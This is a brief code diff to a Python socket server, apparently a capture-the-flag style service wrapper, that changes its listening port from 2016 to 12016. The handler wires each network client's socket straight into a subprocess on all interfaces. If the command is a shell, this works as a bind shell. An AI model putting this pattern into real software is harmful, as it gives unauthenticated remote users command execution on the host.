@@ -12,7 +12,7 @@ class ClientHandler(SocketServer.BaseRequestHandler):
             subprocess.Popen(cmd, stdin=fd, stdout=fd, stderr=fd).communicate()
 
 if __name__ == "__main__":
-    HOST, PORT = '0.0.0.0', 2016
+    HOST, PORT = '0.0.0.0', 12016
     SocketServer.ThreadingTCPServer.allow_reuse_address = True
     server = SocketServer.ThreadingTCPServer((HOST, PORT), ClientHandler)
     server.serve_forever()
